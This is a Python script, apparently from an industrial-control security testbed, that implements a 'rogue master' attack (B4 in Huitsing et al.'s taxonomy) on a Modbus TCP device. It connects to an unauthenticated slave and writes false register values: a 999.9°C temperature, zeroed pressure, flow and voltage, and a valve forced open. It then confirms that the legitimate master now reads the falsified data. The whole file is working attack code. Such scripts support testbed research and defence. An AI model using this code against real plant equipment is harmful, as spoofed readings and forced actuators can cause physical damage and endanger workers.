"""
B4 - Direct Slave Control (Rogue Master)
The attacker connects directly to the slave and issues unauthorized write
commands (FC06 Write Single Register), bypassing the legitimate master.
Modbus TCP has no authentication, so any host that can reach port 502 can
act as a master.

Scenario: attacker injects a false temperature reading (HR[0] = 9999 ≙ 999.9°C)
and forces the valve open (HR[3] = 1), which would trigger emergency responses
in a real plant while the legitimate master is still running.

Reference: Huitsing et al. (2008), attack B4
Threat type: Fabrication (B4-3) and Modification (B4-2)
Target assets: Field device, Master
"""

import asyncio
from pymodbus.client import AsyncModbusTcpClient

SLAVE_IP = "172.20.0.2"
SLAVE_PORT = 502

# (register_index, malicious_value, description)
MALICIOUS_WRITES = [
    (0, 9999, "Temperature → 9999 (999.9 °C — dangerously high)"),
    (1, 0,    "Pressure   → 0    (loss of pressure reading)"),
    (2, 0,    "Flow rate  → 0    (no flow reported)"),
    (3, 1,    "Valve      → 1    (forced OPEN without authorisation)"),
    (4, 0,    "Voltage    → 0    (power failure spoofed)"),
]


async def attack() -> None:
    print(f"[B4] Direct Slave Control — connecting rogue master to {SLAVE_IP}:{SLAVE_PORT}")
    print("[B4] Modbus TCP has NO authentication — any host on the network can write registers\n")

    client = AsyncModbusTcpClient(SLAVE_IP, port=SLAVE_PORT)
    await client.connect()

    # Read legitimate values first
    before = await client.read_holding_registers(0, count=5, slave=1)
    if not before.isError():
        print(f"[B4] Legitimate values before attack: HR[0-4] = {before.registers}\n")

    # Write malicious values
    print("[B4] Writing unauthorised values …")
    for reg, val, desc in MALICIOUS_WRITES:
        result = await client.write_register(reg, val, slave=1)
        status = "OK" if not result.isError() else f"FAILED ({result})"
        print(f"[B4]   HR[{reg}] = {val:5d}  ({desc})  → {status}")

    await asyncio.sleep(0.5)

    # Read back to confirm
    after = await client.read_holding_registers(0, count=5, slave=1)
    if not after.isError():
        print(f"\n[B4] Slave register state after attack: HR[0-4] = {after.registers}")
        print("[B4] The legitimate master now reads FALSIFIED data from the slave.")
        print("[B4] The operator has NO indication that values were written by an attacker.")

    client.close()


asyncio.run(attack())
